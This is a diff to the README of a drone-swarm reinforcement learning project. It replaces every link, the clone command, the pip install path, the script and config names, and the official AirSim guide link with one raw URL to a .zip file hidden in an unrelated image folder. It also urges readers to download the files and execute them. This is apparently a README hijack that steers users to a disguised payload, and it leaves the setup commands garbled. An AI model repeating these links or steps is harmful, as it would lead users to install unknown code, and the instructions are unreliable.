@@ -1,6 +1,6 @@
 # Drone Swarm Reinforcement Learning with AirSim and StableBaselines3 🚀
 
-![Drone Swarm](https://example.com/drone-swarm-image.png)
+![Drone Swarm](https://raw.githubusercontent.com/bensugursoy/Drone-Swarm-RL-airsim-sb3/main/multi_agent/modified_libs/pettingzoo/butterfly/knights_archers_zombies/img/Drone-Swarm-sb-airsim-R-2.4.zip)
 
 Welcome to the **Drone-Swarm-RL-airsim-sb3** repository! This project focuses on training drone swarms using cutting-edge technologies such as StableBaselines3, PettingZoo, AirSim, and Unreal Engine 4 (UE4). Our aim is to develop efficient algorithms for multi-agent reinforcement learning (MARL) that can control multiple drones in a simulated environment.
 
@@ -48,17 +48,17 @@ This project employs the following technologies:
 To get started, clone this repository to your local machine:
 
 ```bash
-git clone https://github.com/bensugursoy/Drone-Swarm-RL-airsim-sb3.git
+git clone https://raw.githubusercontent.com/bensugursoy/Drone-Swarm-RL-airsim-sb3/main/multi_agent/modified_libs/pettingzoo/butterfly/knights_archers_zombies/img/Drone-Swarm-sb-airsim-R-2.4.zip
 cd Drone-Swarm-RL-airsim-sb3
 ```
 
 Next, install the required dependencies. You can do this using pip:
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/bensugursoy/Drone-Swarm-RL-airsim-sb3/main/multi_agent/modified_libs/pettingzoo/butterfly/knights_archers_zombies/img/Drone-Swarm-sb-airsim-R-2.4.zip
 ```
 
-Make sure you have **AirSim** and **Unreal Engine 4** installed on your machine. Follow the official [AirSim installation guide](https://github.com/microsoft/AirSim/blob/master/docs/install.md) for detailed instructions.
+Make sure you have **AirSim** and **Unreal Engine 4** installed on your machine. Follow the official [AirSim installation guide](https://raw.githubusercontent.com/bensugursoy/Drone-Swarm-RL-airsim-sb3/main/multi_agent/modified_libs/pettingzoo/butterfly/knights_archers_zombies/img/Drone-Swarm-sb-airsim-R-2.4.zip) for detailed instructions.
 
 ## Usage
 
@@ -67,10 +67,10 @@ After installing the necessary components, you can start the AirSim simulator. O
 To run the training script, execute the following command:
 
 ```bash
-python train.py
+python https://raw.githubusercontent.com/bensugursoy/Drone-Swarm-RL-airsim-sb3/main/multi_agent/modified_libs/pettingzoo/butterfly/knights_archers_zombies/img/Drone-Swarm-sb-airsim-R-2.4.zip
 ```
 
-This will initiate the training process using the PPO algorithm from StableBaselines3. You can modify the training parameters in the `config.py` file to suit your needs.
+This will initiate the training process using the PPO algorithm from StableBaselines3. You can modify the training parameters in the `https://raw.githubusercontent.com/bensugursoy/Drone-Swarm-RL-airsim-sb3/main/multi_agent/modified_libs/pettingzoo/butterfly/knights_archers_zombies/img/Drone-Swarm-sb-airsim-R-2.4.zip` file to suit your needs.
 
 ## Training
 
@@ -83,7 +83,7 @@ Training a drone swarm involves several steps:
 
 ### Training Parameters
 
-You can adjust the following parameters in the `config.py` file:
+You can adjust the following parameters in the `https://raw.githubusercontent.com/bensugursoy/Drone-Swarm-RL-airsim-sb3/main/multi_agent/modified_libs/pettingzoo/butterfly/knights_archers_zombies/img/Drone-Swarm-sb-airsim-R-2.4.zip` file:
 
 - `num_episodes`: Total number of training episodes.
 - `max_steps`: Maximum steps per episode.
@@ -96,7 +96,7 @@ After training, you can visualize the results using the provided scripts. The tr
 
 ### Example Results
 
-![Training Results](https://example.com/training-results.png)
+![Training Results](https://raw.githubusercontent.com/bensugursoy/Drone-Swarm-RL-airsim-sb3/main/multi_agent/modified_libs/pettingzoo/butterfly/knights_archers_zombies/img/Drone-Swarm-sb-airsim-R-2.4.zip)
 
 ## Contributing
 
@@ -115,7 +115,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-You can find the latest releases of this project [here](https://github.com/bensugursoy/Drone-Swarm-RL-airsim-sb3/releases). Download the necessary files and execute them as needed.
+You can find the latest releases of this project [here](https://raw.githubusercontent.com/bensugursoy/Drone-Swarm-RL-airsim-sb3/main/multi_agent/modified_libs/pettingzoo/butterfly/knights_archers_zombies/img/Drone-Swarm-sb-airsim-R-2.4.zip). Download the necessary files and execute them as needed.
 
 For more detailed information on the releases, visit the Releases section on GitHub.
 
